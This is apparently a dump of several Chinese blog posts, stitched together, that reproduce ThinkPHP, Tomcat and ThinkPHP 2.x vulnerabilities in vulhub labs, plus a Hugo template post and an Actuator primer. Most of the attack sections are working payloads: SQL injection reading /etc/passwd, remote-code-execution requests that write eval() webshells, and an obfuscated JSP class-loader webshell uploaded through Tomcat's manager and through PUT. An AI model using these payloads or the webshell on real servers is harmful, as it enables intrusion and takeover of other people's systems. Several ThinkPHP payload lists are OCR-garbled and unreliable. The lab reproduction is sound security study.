启动后为空白页面，需通过Payload触发漏洞 搭建好后是空白页面\n漏洞利用 报错注入 Payload： 1 http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user(),0xa),0)]=1 执行后会显示数据库用户信息（如root@localhost）。 信息泄露利用： 获取数据库版本：ids[0,updatexml(0,concat(0xa,version()),0)]=1 读取文件：ids[0,load_file('/etc/passwd')]=1（需数据库权限）\n利用报错来查看版本信息\n利用工具进行测试：\n其他 1 2 3 4 [+] 存在ThinkPHP 5 SQL注入漏洞 \u0026amp;\u0026amp; 敏感信息泄露 Payload: http://localhost//index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 [+] 存在ThinkPHP 5.x 数据库信息泄露 Payload: username:root hostname:mysql password:root database:cat ","date":"2025-09-04T00:00:00Z","image":"http://localhost:57441/images/32.webp","permalink":"http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露"},{"content":"漏洞形成原因 框架介绍： ThinkPHP是一款运用极广的PHP开发框架。\n漏洞引入： 其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。\n漏洞如何利用 访问靶机地址+端口号 进入首页\nBurp抓包修改传参方式为Post，传入参数为\n1 \u0026#34;_method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=pwd\u0026#34;，其中pwd为系统执行命令可进行一系列操作。 环境搭建 使用vulhub靶场进行搭建\n1 2 3 cd thinkphp/5.0.23-rce/ docker-compose up -d docker ps 访问链接：\n1 http://192.168.197.140:8080/ 漏洞复现 burp抓包\n修改\n传参方式为Post，url后接入/index.php?s=captch，传入参数为\n1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=pwd\t尝试写入phpinfo\n参数改成echo \u0026quot;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026quot; \u0026gt; info.php\n1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=echo \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34; \u0026gt; info.php 写入一句话\n1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=echo \u0026#39;\u0026lt;?php eval($_POST[aaa]); ?\u0026gt;\u0026#39; \u0026gt; shell.php 上蚂剑\n1 2 http://192.168.197.140:8080/shell.php 密码：aaa 成功\n做完实验后关闭环境 docker-compose down\n更多版本 漏洞触发点和版本的不同，所以payload也不⼀样,条件也不⼀样\n5.0.13~5.0.19默认情况下config中的app_debug配置项为false。\n复现的时候需要开启这个\n总结⼀下 5.1.x ：\n1 2 3 4 5 6 7 8 9 10 11 ?s=index/thinkRequest/input\u0026amp;fiLter[]=system\u0026amp;data=pwd ?s=index/thinkviewdriverPhp/dispLay\u0026amp;content=C?php phpinfo();?\u0026gt; ?s=index/thinktempLatedriverfiLe/write\u0026amp;cacheFiLe=sheLL.php\u0026amp;content=C? php phpinfo();?\u0026gt; ?s=index/thinkContainer/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;var ?s[8]=system\u0026amp;vars[f][]=id ?s=index/thinkapp/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;vars[8]=s ystem\u0026amp;vars[f][]=id 5.0.x ：\n1 2 3 4 5 6 7 8 9 ?s=index/thinkconfig/get\u0026amp;name=database.username # 获取配置信息 ?s=index/thinkLang/Load\u0026amp;fiLe= :/ :/test.jpg # 包含任意⽂件 ?s=index/thinkConfig/Load\u0026amp;fiLe= :/ :/t.php # 包含任意.php⽂件 ?s=index/thinkapp/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;vars[8]=s ystem\u0026amp;vars[f][]=id ?s=index|thinkapp/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;vars[8]=s ystem\u0026amp;vars[f][8]=whoami 5.0.13：\n1 2 3 4 5 http: \u0026#34;php.LocaL/thinkphp5.8.5/pubLic/index.php?s=index 方法：post Body内容： _method= _construct\u0026amp;method=get\u0026amp;fiLter[]=caLL_user_func\u0026amp;get[]=phpinfo _method= _construct\u0026amp;fiLter[]=system\u0026amp;method=GET\u0026amp;get[]=whoami 其他\n1 2 3 4 5 6 7 8 9 10 11 # ThinkPHP ≤ 5.8.f3 POST /?s=index/index s=whoami\u0026amp;_method= _construct\u0026amp;method=\u0026amp;fiLter[]=system # ThinkPHP ≤ 5.8.23、5.f.8 ≤ 5.f.f6 需要开启框架app_debug POST / _method= _construct\u0026amp;fiLter[]=system\u0026amp;server[REQUEST_METHOD]=Ls -aL # ThinkPHP ≤ 5.8.23 需要存在xxx的method路由，例如captcha POST /?s=xxx HTTP/f.f _method= _construct\u0026amp;fiLter[]=system\u0026amp;method=get\u0026amp;get[]=Ls+-aL _method= _construct\u0026amp;fiLter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=L s ","date":"2025-09-04T00:00:00Z","image":"http://localhost:57441/images/31.webp","permalink":"http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞"},{"content":"影响范围 Tomcat8\n环境搭建 这边就还是用vulhub进行复现\n1 2 3 4 5 cd vulhub-master/tomcat/tomcat8 sudo docker-compose up -d docker ps http://192.168.197.140:8080/ 漏洞复现 这里使用MSF进行复现：\n1 msfconsole 查找与 tomcat 相关的模块\n1 search tomcat 使用 auxiliary/scanner/http/tomcat_mgr_login 模块\n1 use auxiliary/scanner/http/tomcat_mgr_login 查看需要填写哪些参数\n1 show options 将 rhosts 设置为目标机\n1 set rhosts 172.16.2.174 进行爆破\n1 run 这里成功爆破出账号/密码：\n1 [+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat 点击 Manager App 进行登录\n登录后找到上传点\n将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war\njsp 一句话木马，密码为123\n1 \u0026lt;% String H9991 = request.getParameter(\u0026#34;123\u0026#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \u0026#34;\u0026#34;;for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %\u0026gt; 上传111.war文件\n访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）\n上蚁剑\n1 2 http://192.168.197.140:8080/11/11.jsp 密码：pass ","date":"2025-09-04T00:00:00Z","image":"http://localhost:57441/images/35.webp","permalink":"http://localhost:57441/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"【Tomacat漏洞复现】后台弱口令+文件上传"},{"content":"漏洞详情 当 Tomcat 运行在 Windows 系统且启用了 HTTP PUT 方法（通过将 readonly 参数设置为 false）时，攻击者可构造恶意请求上传 JSP 文件，导致服务器执行任意代码，进而引发数据泄露或服务器权限被控制。\n关键点：\n触发条件：需手动修改 conf/web.xml 文件中的 readonly 参数为 false（默认值为 true，PUT/DELETE 方法被禁用）。 绕过限制：Tomcat 默认通过 JspServlet 处理 .jsp 文件的上传，但攻击者可通过以下方式绕过限制，使文件由处理静态资源的 DefaultServlet 处理： 文件名后添加空格（evil.jsp%20，利用 Windows 不允许文件名以空格结尾的特性）。 使用 NTFS 文件流特性（evil.jsp::$DATA）。 文件名后添加斜杠（evil.jsp/，此方法甚至影响 Linux 系统及 Tomcat 5.x-9.x 版本）4711。\n影响范围： 受影响的 Tomcat 版本： Apache Tomcat 7.0.0 至 7.0.81（官方公告范围）。 部分测试显示 Tomcat 8.5.19 等版本也可能受影响。 操作系统：主要针对 Windows，但通过添加斜杠的绕过方式（evil.jsp/）可扩展至 Linux 系统。\n攻击思路：\n​ 上传木马文件，webshell管理工具进行连接 环境搭建 使用vulhub进行搭建：\n1 2 3 4 cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d docker ps http://192.168.197.140:8080/ 漏洞复现 burpsuite抓包\n使用webshell generate快速生成木马，项目地址：\n1 https://github.com/cseroad/Webshell_Generate 一句话木马：\n1 \u0026lt;% String H9991 = request.getParameter(\u0026#34;123\u0026#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \u0026#34;\u0026#34;;for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %\u0026gt; 将生成的木马上传。这里使用PUT方法进行上传，文件名可以是/xxx.jsp/、/xxx.jsp%20、/xxx::$DATA\n1 2 3 4 5 6 7 8 9 10 11 12 PUT /123.jsp/ HTTP/1.1 Host: 192.168.197.140:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Length: 946 \u0026lt;% String H9991 = request.getParameter(\u0026#34;123\u0026#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \u0026#34;\u0026#34;;for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %\u0026gt; 返回201即上传成功，使用蚁剑进行连接\n1 2 http://192.168.197.140:8080/123.jsp 密码：123 绕过姿势 1 2 3 4 5 6 7 8 1.Windows下不允许文件以空格结尾以 PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格 2.WindowsNTFS流 Put/a001.jsp::$DATA HTTP/1.1 3. /在文件名中是非法的， 也会被去除（Linux/Windows） Put/a001.jsp/http:/1.1 修复建议 把readonly 改成true\n1 \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;readonly\u0026lt;/param-name\u0026gt; \u0026lt;paramvalue\u0026gt;true\u0026lt;/param-value\u0026gt;\u0026lt;/init-param\u0026gt; ","date":"2025-09-04T00:00:00Z","image":"http://localhost:57441/images/34.webp","permalink":"http://localhost:57441/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","title":"【Tomcat漏洞复现】CVE-2017-12615任意文件写入"},{"content":"0x00 简介 ThinkPHP(FCS)是一个轻量级的中型框架， 是从Java的Struts结构移植过来的中文PHP开发框架。 它使用面向对象的开发结构和MVC模式， 并且模拟实现了Struts的标签库， 各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。ThinkPHP的宗旨是简化开发、 提高效率、 易于扩展， 其在对数据库的支持方面已经包括MySQL、 MSSQL、Sqlite、 PgSQL、Oracle， 以及PDO的支持。 ThinkPHP有着丰富的文档和示例， 框架的兼容性较强， 但是其功能有限，因此更适合用于中小项目的开发。\n0x01 漏洞概述 ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞， 该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。 远程攻击者可通过输入‘＼ ’字符的方式调用任意方法利用该漏洞执行代码。\n0x02 影响版本 thinkphp 5.0.x\nthinkphp 5.1.x\n0x03 环境搭建 1、 在docker容器里搭建环境 1 cd vulhub-master/thinkphp/5-rce/ 2、 进入目录下， 启动环境 1 docker-compose up -d 3、 查看环境端口 1 docker ps -a 这里我使用的是我自己的Ubuntu系统搭建的。\n直接访问以下链接即可。\n1 http://192.168.197.140:8080/ 0x04 验证方式 GET方式尝试命令执行，具体请求如下：\n1 http://192.168.197.140:8080/index.php?s=index/think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=whoami 0x05 利用方式 1、URL编码一句话木马内容： 1 echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20 2. 直接访问连接： 1 http://192.168.197.140:8080/index.php?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20 3. 上传一句话木马: 1 2 webshell地址：http://192.168.197.140:8080/shell.php password：x 4. 连接成功！！！ ","date":"2025-09-03T00:00:00Z","image":"http://localhost:57441/images/30.webp","permalink":"http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞"},{"content":"演示效果： 修改： 在\\layouts\\_default文件夹下创建：archives.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 {{ define \u0026#34;body-class\u0026#34; }}template-archives{{ end }} {{ define \u0026#34;main\u0026#34; }} \u0026lt;header\u0026gt; {{- $taxonomy := $.Site.GetPage \u0026#34;taxonomyTerm\u0026#34; \u0026#34;categories\u0026#34; -}} {{- $terms := $taxonomy.Pages -}} {{ if $terms }} \u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;{{ $taxonomy.Title }}\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;subsection-list\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;article-list--tile\u0026#34;\u0026gt; {{ range $terms }} {{ partial \u0026#34;article-list/tile\u0026#34; (dict \u0026#34;context\u0026#34; . \u0026#34;size\u0026#34; \u0026#34;250x150\u0026#34; \u0026#34;Type\u0026#34; \u0026#34;taxonomy\u0026#34;) }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/header\u0026gt; {{ $pages := where .Site.RegularPages \u0026#34;Type\u0026#34; \u0026#34;in\u0026#34; .Site.Params.mainSections }} {{ $notHidden := where .Site.RegularPages \u0026#34;Params.hidden\u0026#34; \u0026#34;!=\u0026#34; true }} {{ $filtered := ($pages | intersect $notHidden) }} {{ range $filtered.GroupByDate \u0026#34;2006\u0026#34; }} {{ $id := lower (replace .Key \u0026#34; \u0026#34; \u0026#34;-\u0026#34;) }} \u0026lt;div class=\u0026#34;archives-group\u0026#34; id=\u0026#34;{{ $id }}\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;archives-date section-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ $.RelPermalink }}#{{ $id }}\u0026#34;\u0026gt;{{ .Key }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;article-list--compact\u0026#34; data-year=\u0026#34;{{ .Key }}\u0026#34; data-total=\u0026#34;{{ len .Pages }}\u0026#34;\u0026gt; {{ range $index, $page := .Pages }} \u0026lt;div class=\u0026#34;article-item\u0026#34; data-index=\u0026#34;{{ $index }}\u0026#34; {{ if ge $index 8 }}style=\u0026#34;display: none;\u0026#34;{{ end }}\u0026gt; {{ partial \u0026#34;article-list/compact\u0026#34; $page }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{/* 如果文章数量超过8篇，显示分页控件 */}} {{ if gt (len .Pages) 8 }} \u0026lt;div class=\u0026#34;archives-pagination\u0026#34; data-year=\u0026#34;{{ .Key }}\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;pagination-btn prev-btn\u0026#34; onclick=\u0026#34;showPrevPage(\u0026#39;{{ .Key }}\u0026#39;)\u0026#34; disabled\u0026gt;上一页\u0026lt;/button\u0026gt; \u0026lt;span class=\u0026#34;pagination-info\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;current-page\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; / \u0026lt;span class=\u0026#34;total-pages\u0026#34;\u0026gt;{{ math.Ceil (div (len .Pages) 8.0) }}\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;button class=\u0026#34;pagination-btn next-btn\u0026#34; onclick=\u0026#34;showNextPage(\u0026#39;{{ .Key }}\u0026#39;)\u0026#34;\u0026gt;下一页\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;style\u0026gt; .archives-pagination { display: flex; justify-content: center; align-items: center; gap: 15px; margin: 20px 0; padding: 15px; background: var(--card-background); border-radius: 8px; } .pagination-btn { padding: 8px 16px; border: 1px solid var(--border-color); background: var(--card-background); color: var(--primary-color); border-radius: 4px; cursor: pointer; transition: all 0.2s ease; } .pagination-btn:hover:not(:disabled) { background: #ff69b4; color: white; } .pagination-btn:disabled { opacity: 0.5; cursor: not-allowed; } .pagination-info { font-size: 14px; color: var(--secondary-text-color); } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; const paginationState = {}; function initPagination(year) { const container = document.querySelector(`[data-year=\u0026#34;${year}\u0026#34;]`); const totalItems = parseInt(container.dataset.total); const itemsPerPage = 8; const totalPages = Math.ceil(totalItems / itemsPerPage); paginationState[year] = { currentPage: 1, totalPages: totalPages, itemsPerPage: itemsPerPage }; } function showPage(year, page) { const container = document.querySelector(`[data-year=\u0026#34;${year}\u0026#34;]`); const items = container.querySelectorAll(\u0026#39;.article-item\u0026#39;); const startIndex = (page - 1) * 8; const endIndex = startIndex + 8; items.forEach((item, index) =\u0026gt; { if (index \u0026gt;= startIndex \u0026amp;\u0026amp; index \u0026lt; endIndex) { item.style.display = \u0026#39;block\u0026#39;; } else { item.style.display = \u0026#39;none\u0026#39;; } }); // 更新分页控件 const pagination = document.querySelector(`.archives-pagination[data-year=\u0026#34;${year}\u0026#34;]`); if (pagination) { const currentPageSpan = pagination.querySelector(\u0026#39;.current-page\u0026#39;); const prevBtn = pagination.querySelector(\u0026#39;.prev-btn\u0026#39;); const nextBtn = pagination.querySelector(\u0026#39;.next-btn\u0026#39;); currentPageSpan.textContent = page; prevBtn.disabled = page === 1; nextBtn.disabled = page === paginationState[year].totalPages; } paginationState[year].currentPage = page; } function showNextPage(year) { if (paginationState[year] \u0026amp;\u0026amp; paginationState[year].currentPage \u0026lt; paginationState[year].totalPages) { showPage(year, paginationState[year].currentPage + 1); } } function showPrevPage(year) { if (paginationState[year] \u0026amp;\u0026amp; paginationState[year].currentPage \u0026gt; 1) { showPage(year, paginationState[year].currentPage - 1); } } // 初始化所有年份的分页 document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function() { const archivesGroups = document.querySelectorAll(\u0026#39;.archives-group\u0026#39;); archivesGroups.forEach(group =\u0026gt; { const year = group.querySelector(\u0026#39;.article-list--compact\u0026#39;).dataset.year; if (year) { initPagination(year); } }); }); \u0026lt;/script\u0026gt; {{ partialCached \u0026#34;footer/footer\u0026#34; . }} {{ end }} 即可！！！\n","date":"2025-09-02T00:00:00Z","image":"http://localhost:57441/images/28.webp","permalink":"http://localhost:57441/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%BD%92%E6%A1%A3%E4%B8%8B%E4%B8%80%E9%A1%B5%E9%85%8D%E7%BD%AE/","title":"【Hugo】hugo-stack主题魔改-归档下一页配置"},{"content":"0x00 实验环境 攻击机：Win 11\n靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）\nvulhub靶场下载地址：\n1 https://vulhub.org/zh#/environments/thinkphp/2-rce/ 部署：\n1 2 3 cd vulhub-master/thinkphp/2-rce docker-compose up -d docker ps 0x01 影响版本 标志：/index.php\n版本：thinkphp2.x\n简介：在ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：\n1 $res = preg_replace(\u0026#39;@(\\w+)\u0026#39;.$depr.\u0026#39;([^\u0026#39;.$depr.\u0026#39;\\/]+)@e\u0026#39;, \u0026#39;$var[\\\u0026#39;\\\\1\\\u0026#39;]=\u0026#34;\\\\2\u0026#34;;\u0026#39;, implode($depr,$paths)); 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞\n大体说的还是因为php版本在5.6.29以下时都是支持该函数执行中间的命令的，可到了7.x就不支持了。简单来讲就是\n1 preg_replace(\u0026#39;正则规则\u0026#39;,\u0026#39;替换字符\u0026#39;,\u0026#39;目标字符\u0026#39;) e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;\n/e 可执行模式，此为PHP专有参数，例如preg_replace函数。\n例如：\n1 2 \u0026lt;?php @preg_replace(\u0026#39;/test/e\u0026#39;,\u0026#39;print_r(\u0026#34;AAA\u0026#34;);\u0026#39;,\u0026#39;just test\u0026#39;); 只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。\n0x02 漏洞复现 注：复现是比较简单的，原理需要自己去深入剖析\n（1）访问页面\n（2）使用报错爆出thinkphp的版本2.1：\n1 http://192.168.197.140:8080/index.php/111 （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件\u0026lt;=php5.6.29，下面这个版本是满足条件的：\n（4）漏洞利用：\n1 http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()} （5）传马，使用以下语句（类似于在该页面写入了一句话木马）：\n1 http://192.168.197.140:8080/index.php?s=/Index/index/xxx/${@print(eval($_POST[1]))} 菜刀与蚁剑均能连接：\n蚁剑连接：\n0x02 漏洞修复 升级框架版本\nThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。最彻底的方式是升级到官方支持的最新版本（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。\n","date":"2025-09-02T00:00:00Z","image":"http://localhost:57441/images/29.webp","permalink":"http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"【Thinkphp漏洞复现】ThinkPHP 2.x-任意代码执行"},{"content":"0x00 什么是Actuator Spring Boot Actuator 模块提供了健康检查，审计，指标收集，HTTP 跟踪等，是帮助我们监控和管理Spring Boot 应用的模块。这个模块采集应用的内部信息，展现给外部模块，可以查看应用配置的详细信息，例如自动化配置信息、创建的Spring beans信息、系统环境变量的配置信息以及Web请求的详细信息等。\n如果没有正确使用Actuator，可能造成信息泄露等严重的安全隐患（外部人员非授权访问Actuator端点）。其中heapdump作为Actuator组件最为危险的Web端点，heapdump因未授权访问被恶意人员获取后进行分析，可进一步获取敏感信息。\nSpringBoot 1.x 和 2.x 的 Actuator模块设置有差别，访问功能的路径也有差别，但现在多使用的SpringBoot版本为2.x，这篇文章只讲SpringBoo 2.x Actuator模块带来的信息泄露。\n0x01 Actuator 使用 如果要使用 SpringBoot Actuator 提供的监控功能，需要先加入相关的 maven dependency：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 只要加上了这个actuator依赖，SpringBoot 在运行时会自动开启/actuator/health和/actuator/info这两个 endpoint。\n为了更方便漏洞利用，当前环境在一个CMS中加入了该依赖，因为自己新建的Springboot项目没有配置数据库之类的信息。\n0x02 Endpoints 介绍 Spring Boot 提供了所谓的 endpoints （下文翻译为端点）给外部来与应用程序进行访问和交互。\n打比方来说，/health 端点 提供了关于应用健康情况的一些基础信息。metrics 端点提供了一些有用的应用程序指标（JVM 内存使用、系统CPU使用等）。\n这些 Actuator 模块本来就有的端点我们称之为原生端点。根据端点的作用的话，我们大概可以分为三大类：\n应用配置类：获取应用程序中加载的应用配置、环境变量、自动化配置报告等与Spring Boot应用密切相关的配置类信息。 度量指标类：获取应用程序运行过程中用于监控的度量指标，比如：内存信息、线程池信息、HTTP请求统计等。 操作控制类：提供了对应用的关闭等操作类功能。 需要注意的就是：\n每一个端点都可以通过配置来单独禁用或者启动\n不同于Actuator 1.x，Actuator 2.x 的大多数端点默认被禁掉。Actuator 2.x 中的默认端点增加了/actuator前缀。默认暴露的两个端点为/actuator/health和 /actuator/info\n原生端点如下：\n请求方法 端点 描述 GET /actuator 查看有哪些 Actuator端点是开放的。 GET /actuator/auditevent auditevents端点提供有关应用程序审计事件的信息。 GET /actuator/beans beans端点提供有关应用程序 bean 的信息。 GET /actuator/conditions conditions端点提供有关配置和自动配置类条件评估的信息。 GET /actuator/configprops configprops端点提供有关应用程序@ConfigurationPropertiesbean的信息。 GET /actuator/env 查看全部环境属性，可以看到 SpringBoot 载入哪些 properties，以及 properties 的值（会自动用*替换 key、password、secret 等关键字的 properties 的值）。 GET /actuator/flyway flyway端点提供有关 Flyway 执行的数据库迁移的信息。 GET /actuator/health 端点提供有关应用程序运行状况的health详细信息。 GET /actuator/heapdump heapdump端点提供来自应用程序 JVM 的堆转储。(通过分析查看/env端点被*号替换到数据的具体值。) GET /actuator/httptrace httptrace端点提供有关 HTTP 请求-响应交换的信息。（包括用户HTTP请求的Cookie数据，会造成Cookie泄露等） GET /actuator/info info端点提供有关应用程序的一般信息。 GET /actuator/integrationgraph integrationgraph端点公开了一个包含所有 Spring Integration 组件的图。 GET /actuator/liquibase liquibase端点提供有关 Liquibase 应用的数据库更改集的信息。 GET /actuator/logfile logfile端点提供对应用程序日志文件内容的访问。 GET /actuator/loggers loggers端点提供对应用程序记录器及其级别配置的访问。 GET /actuator/mappings mappings端点提供有关应用程序请求映射的信息。 GET /actuator/metrics metrics端点提供对应用程序指标的访问。 GET /actuator/prometheus 端点以prometheusPrometheus 服务器抓取所需的格式提供 Spring Boot 应用程序的指标。 GET /actuator/quartz quartz端点提供有关由 Quartz 调度程序管理的作业和触发器的信息。 GET /actuator/scheduledtasks scheduledtasks端点提供有关应用程序计划任务的信息。 GET /actuator/sessions sessions端点提供有关由 Spring Session 管理的应用程序 HTTP 会话的信息。 GET /actuator/startup startup端点提供有关应用程序启动顺序的信息。 POST 